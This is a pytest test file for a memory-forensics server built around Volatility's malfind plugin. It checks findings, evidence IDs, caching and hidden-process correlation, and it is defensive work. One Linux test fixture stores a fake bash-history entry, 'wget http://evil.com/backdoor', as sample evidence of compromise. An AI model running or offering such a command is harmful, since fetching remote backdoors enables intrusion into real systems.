import pytest
from unittest.mock import patch
from requests.exceptions import Timeout

import mcp_server
import session as case_session
import evidence_store
from filters import malfind as malfind_filter


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def sample_windows_malfind_rows():
    return [
        {
            "PID": 100,
            "Process": "svchost.exe",
            "Start VPN": "0x10000",
            "End VPN": "0x11000",
            "Protection": "PAGE_EXECUTE_READWRITE",
            "CommitCharge": 1,
            "PrivateMemory": 1,
            "Hexdump": "4d 5a 90 00 ...\nde ad be ef\nca fe ba be",
            "Disasm": "MOV EAX, 1\nRET\nNOP\nNOP\nNOP\nINT3"
        },
        {
            "PID": None,
            "Process": "unmappable",
            "Start VPN": "0x20000",
            "End VPN": "0x21000",
            "Protection": "PAGE_EXECUTE_READWRITE",
            "Hexdump": "eb fe",
            "Disasm": "JMP 0"
        }
    ]


@pytest.fixture
def sample_linux_malfind_rows():
    return [
        {
            "Pid": 555,
            "COMM": "suspicious_bin",
            "Start": "0x7f0000",
            "End": "0x7f1000",
            "VMA Protection": "rwxp",
            "Mapping": "[heap]",
            "Hexdump": "7f 45 4c 46 ...",
            "Disasm": "MOV RAX, 0x3b\nSYSCALL"
        }
    ]


# ── Requirement 1: Windows malfind execution ─────────────────────────────────

def test_vol_malfind_windows(temp_db, mock_backend, sample_windows_malfind_rows):
    """Windows malfind execution routes to win_malfind and returns findings."""
    session_id = case_session.create_session("win-test", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(sample_windows_malfind_rows),
        "rows": sample_windows_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_malfind()

    assert res["finding_count"] == 2
    assert res["execution_status"] == "executed"
    mock_backend.assert_called_once_with("win_malfind", "mem.raw", [])

    # Provenance: evidence rows exist in the ledger
    ev = evidence_store.search_evidence(session_id, plugin="win_malfind")
    assert len(ev) == 2


# ── Requirement 2: Linux malfind execution ───────────────────────────────────

def test_vol_malfind_linux(temp_db, mock_backend, sample_linux_malfind_rows):
    """Linux malfind execution routes to linux_malfind."""
    session_id = case_session.create_session("lin-test", "mem.raw", "linux")
    mock_backend.return_value = {
        "plugin": "linux_malfind",
        "row_count": len(sample_linux_malfind_rows),
        "rows": sample_linux_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "linux"}
        res = mcp_server.vol_malfind()

    assert res["finding_count"] == 1
    mock_backend.assert_called_once_with("linux_malfind", "mem.raw", [])


# ── Requirement 3: Unsupported OS rejection ──────────────────────────────────

def test_vol_malfind_unsupported_os(temp_db, mock_backend):
    """Unsupported OS value triggers structured error, no backend call."""
    session_id = case_session.create_session("mac-test", "mem.raw", "linux")

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "mac"}
        res = mcp_server.vol_malfind()

    assert res.get("status") == "invalid_request"
    assert "not implemented for os" in res["error"].lower()
    mock_backend.assert_not_called()


# ── Requirement 4: Empty result handling ─────────────────────────────────────

def test_vol_malfind_empty_results(temp_db, mock_backend):
    """Zero malfind rows returns zero findings."""
    session_id = case_session.create_session("win-test", "mem.raw", "windows")
    mock_backend.return_value = {"plugin": "win_malfind", "row_count": 0, "rows": []}

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_malfind()

    assert res["finding_count"] == 0
    assert len(res["anomalies"]) == 0


# ── Requirement 5: Windows field normalization ───────────────────────────────

def test_vol_malfind_windows_field_normalization(
    temp_db, mock_backend, sample_windows_malfind_rows
):
    """Normalized Windows finding includes address, protection, hexdump, disassembly."""
    session_id = case_session.create_session("norm-win", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(sample_windows_malfind_rows),
        "rows": sample_windows_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_malfind()

    mapped = next(a for a in res["anomalies"] if a.get("pid") == 100)
    assert mapped["process"] == "svchost.exe"
    assert mapped["address"] == "0x10000 - 0x11000"
    assert mapped["protection"] == "PAGE_EXECUTE_READWRITE"
    assert mapped["platform"] == "windows"
    assert mapped["reason"] == "suspicious_memory_region"
    assert "4d 5a" in mapped["hexdump"]
    assert "MOV" in mapped["disassembly"]
    # Hexdump is limited to 3 lines
    assert mapped["hexdump"].count("\n") <= 2
    # Disassembly is limited to 5 lines
    assert mapped["disassembly"].count("\n") <= 4


# ── Requirement 6: Linux field normalization ─────────────────────────────────

def test_vol_malfind_linux_field_normalization(
    temp_db, mock_backend, sample_linux_malfind_rows
):
    """Normalized Linux finding uses COMM/Pid/VMA Protection/Mapping fields."""
    session_id = case_session.create_session("norm-lin", "mem.raw", "linux")
    mock_backend.return_value = {
        "plugin": "linux_malfind",
        "row_count": len(sample_linux_malfind_rows),
        "rows": sample_linux_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "linux"}
        res = mcp_server.vol_malfind()

    finding = res["anomalies"][0]
    assert finding["pid"] == 555
    assert finding["process"] == "suspicious_bin"
    assert finding["address"] == "0x7f0000 - 0x7f1000"
    assert finding["protection"] == "rwxp"
    assert finding["platform"] == "linux"
    assert finding["mapping"] == "[heap]"
    assert "7f 45" in finding["hexdump"]


# ── Requirement 7: Missing optional fields ───────────────────────────────────

def test_vol_malfind_missing_optional_fields(temp_db, mock_backend):
    """Row with only PID present — optional fields absent, no crash."""
    session_id = case_session.create_session("sparse", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": 1,
        "rows": [{"PID": 42}],
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_malfind()

    assert res["finding_count"] == 1
    finding = res["anomalies"][0]
    assert finding["pid"] == 42
    assert "process" not in finding  # not fabricated
    assert "address" not in finding  # not fabricated


# ── Requirement 8: Malformed address handling ────────────────────────────────

def test_vol_malfind_malformed_address(temp_db, mock_backend):
    """Addresses that are not standard hex are passed through without crash."""
    session_id = case_session.create_session("malformed", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": 1,
        "rows": [{"Start VPN": "GARBAGE", "End VPN": "DATA"}],
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_malfind()

    assert res["finding_count"] == 1
    assert res["anomalies"][0]["address"] == "GARBAGE - DATA"


# ── Requirement 9 & 10: Evidence IDs attached + evidence_get() resolves ──────

def test_vol_malfind_evidence_ids_and_evidence_get(
    temp_db, mock_backend, sample_windows_malfind_rows
):
    """Evidence IDs exist in returned anomalies and resolve through evidence_get()."""
    session_id = case_session.create_session("ev-test", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(sample_windows_malfind_rows),
        "rows": sample_windows_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_malfind()

    mapped = next(a for a in res["anomalies"] if a.get("pid") == 100)
    assert len(mapped["evidence_ids"]) >= 1
    ev_id = mapped["evidence_ids"][0]
    assert ev_id.startswith("ev-")

    # evidence_get()
    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        ev = mcp_server.evidence_get(ev_id)

    assert ev["evidence_id"] == ev_id
    assert ev["entity_id"] == "100"


# ── Requirement 11 & 12: Cache returns same evidence IDs, no backend call ───

def test_vol_malfind_caching(temp_db, mock_backend, sample_windows_malfind_rows):
    """Second call is a cache hit returning identical evidence IDs, backend called once."""
    session_id = case_session.create_session("cache-test", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(sample_windows_malfind_rows),
        "rows": sample_windows_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}

        res1 = mcp_server.vol_malfind()
        assert res1["execution_status"] == "executed"

        res2 = mcp_server.vol_malfind()
        assert res2["execution_status"] == "cached"

    assert mock_backend.call_count == 1

    mapped1 = next(a for a in res1["anomalies"] if a.get("pid") == 100)
    mapped2 = next(a for a in res2["anomalies"] if a.get("pid") == 100)
    assert mapped1["evidence_ids"] == mapped2["evidence_ids"]


# ── Requirement 13: Session isolation ────────────────────────────────────────

def test_vol_malfind_session_isolation(temp_db, mock_backend, sample_windows_malfind_rows):
    """Evidence from one session is not visible in another."""
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(sample_windows_malfind_rows),
        "rows": sample_windows_malfind_rows,
    }

    session1 = case_session.create_session("s1", "m1.raw", "windows")
    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session1, "image": "m1.raw", "os": "windows"}
        mcp_server.vol_malfind()

    mock_backend.return_value = {"plugin": "win_malfind", "row_count": 0, "rows": []}
    session2 = case_session.create_session("s2", "m2.raw", "windows")
    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session2, "image": "m2.raw", "os": "windows"}
        mcp_server.vol_malfind()

    ev1 = evidence_store.search_evidence(session1, plugin="win_malfind")
    ev2 = evidence_store.search_evidence(session2, plugin="win_malfind")
    assert len(ev1) == 2
    assert len(ev2) == 0


# ── Requirement 14 & 15: Backend failure + no traceback leak ─────────────────

def test_vol_malfind_backend_failure(temp_db, active_session):
    """Backend timeout produces structured error with no raw traceback."""
    with patch("mcp_server.backend_client.run_plugin") as mock_run:
        mock_run.side_effect = Timeout("Backend timed out")

        with patch("mcp_server._require_active_session") as mock_req:
            mock_req.return_value = {"id": active_session, "image": "mem.raw", "os": "windows"}
            res = mcp_server.vol_malfind()

    assert res["status"] == "backend_timeout"
    assert "timed out" in res["error"].lower()
    assert "Traceback" not in str(res)


# ── Requirement 16: Raw Volatility evidence preserved ────────────────────────

def test_vol_malfind_raw_evidence_preserved(
    temp_db, mock_backend, sample_windows_malfind_rows
):
    """The raw Volatility dictionary is stored intact and retrievable."""
    session_id = case_session.create_session("raw-ev", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(sample_windows_malfind_rows),
        "rows": sample_windows_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_malfind()

    ev_id = next(a for a in res["anomalies"] if a.get("pid") == 100)["evidence_ids"][0]

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        ev = mcp_server.evidence_get(ev_id)

    assert ev["raw"] == sample_windows_malfind_rows[0]


# ── Requirement 17: Windows correlation discovers stored malfind evidence ────

def test_vol_malfind_windows_correlation_discovers_evidence(temp_db, mock_backend):
    """vol_windows_investigate_hidden correlates stored win_malfind evidence by PID."""
    session_id = case_session.create_session("corr-test", "mem.raw", "windows")

    # Store pstree (PID 4 only — 999 hidden)
    pstree_rows = [{"PID": 4, "PPID": 0, "ImageFileName": "System"}]
    run1 = case_session.record_plugin_run(session_id, "win_pstree", len(pstree_rows), 0)
    evidence_store.store_plugin_evidence(session_id, run1, "win_pstree", "vol_pstree", pstree_rows)

    # Store psscan (includes hidden 999)
    psscan_rows = [
        {"PID": 4, "PPID": 0, "ImageFileName": "System"},
        {"PID": 999, "PPID": 4, "ImageFileName": "evil.exe"},
    ]
    run2 = case_session.record_plugin_run(session_id, "win_psscan", len(psscan_rows), 0)
    evidence_store.store_plugin_evidence(session_id, run2, "win_psscan", "vol_hidden_processes", psscan_rows)

    # Store malfind for PID 999 through vol_malfind pipeline
    malfind_rows = [
        {"PID": 999, "Process": "evil.exe", "Start VPN": "0x1000", "End VPN": "0x2000", "Protection": "PAGE_EXECUTE_READWRITE"},
    ]
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(malfind_rows),
        "rows": malfind_rows,
    }
    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        mcp_server.vol_malfind()

    # Now run the correlator
    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        res = mcp_server.vol_windows_investigate_hidden()

    assert res["profiled_count"] == 1
    profile = res["profiles"][0]
    assert profile["pid"] == 999
    assert len(profile["memory_injection_observations"]["regions"]) == 1
    assert profile["memory_injection_observations"]["regions"][0]["protection"] == "PAGE_EXECUTE_READWRITE"
    assert len(profile["memory_injection_observations"]["evidence_ids"]) >= 1


# ── Requirement 18: Linux correlation compatibility ──────────────────────────

def test_vol_malfind_linux_correlation_compatibility(
    temp_db, mock_backend, sample_linux_malfind_rows
):
    """Linux vol_investigate_hidden fetches stored linux_malfind evidence without re-executing."""
    session_id = case_session.create_session("lin-corr", "mem.raw", "linux")

    # Prerequisite: pslist + psscan for hidden process detection
    pslist_rows = [{"PID": 1, "PPID": 0, "COMM": "init"}]
    run1 = case_session.record_plugin_run(session_id, "linux_pslist", len(pslist_rows), 0)
    evidence_store.store_plugin_evidence(session_id, run1, "linux_pslist", "vol_pstree", pslist_rows)

    psscan_rows = [
        {"PID": 1, "PPID": 0, "COMM": "init"},
        {"PID": 555, "PPID": 1, "COMM": "suspicious_bin"},
    ]
    run2 = case_session.record_plugin_run(session_id, "linux_psscan", len(psscan_rows), 0)
    evidence_store.store_plugin_evidence(session_id, run2, "linux_psscan", "vol_hidden_processes", psscan_rows)

    # Store bash evidence (the correlator also searches for bash)
    bash_rows = [{"Pid": 555, "Command": "wget http://evil.com/backdoor"}]
    run3 = case_session.record_plugin_run(session_id, "linux_bash", len(bash_rows), 0)
    evidence_store.store_plugin_evidence(session_id, run3, "linux_bash", "vol_bash", bash_rows)

    # Now run vol_investigate_hidden — it queries stored evidence, does NOT call backend
    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "linux"}
        res = mcp_server.vol_investigate_hidden()

    assert mock_backend.call_count == 0
    assert res["profiled_count"] == 1
    profile = res["profiles"][0]
    assert profile["pid"] == 555


# ── Requirement 19: vol_report() surfaces malfind evidence correctly ─────────

def test_vol_malfind_report_surfaces_evidence(
    temp_db, mock_backend, sample_windows_malfind_rows
):
    """vol_report() includes injection_indicators from stored malfind evidence."""
    session_id = case_session.create_session("rep-test", "mem.raw", "windows")
    mock_backend.return_value = {
        "plugin": "win_malfind",
        "row_count": len(sample_windows_malfind_rows),
        "rows": sample_windows_malfind_rows,
    }

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        mcp_server.vol_malfind()

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        rep = mcp_server.vol_report()

    assert rep["data_availability"]["memory_injection_scan"] is True
    assert len(rep["injection_indicators"]) == 2
    assert rep["injection_indicators"][0]["evidence_ids"][0].startswith("ev-")


# ── Requirement 20: No malfind → no fabricated indicators ────────────────────

def test_vol_malfind_report_no_fabricated_indicators(temp_db, mock_backend):
    """Without malfind evidence, report shows no injection indicators."""
    session_id = case_session.create_session("rep-none", "mem.raw", "windows")

    with patch("mcp_server._require_active_session") as mock_req:
        mock_req.return_value = {"id": session_id, "image": "mem.raw", "os": "windows"}
        rep = mcp_server.vol_report()

    assert rep["data_availability"]["memory_injection_scan"] is False
    assert len(rep["injection_indicators"]) == 0
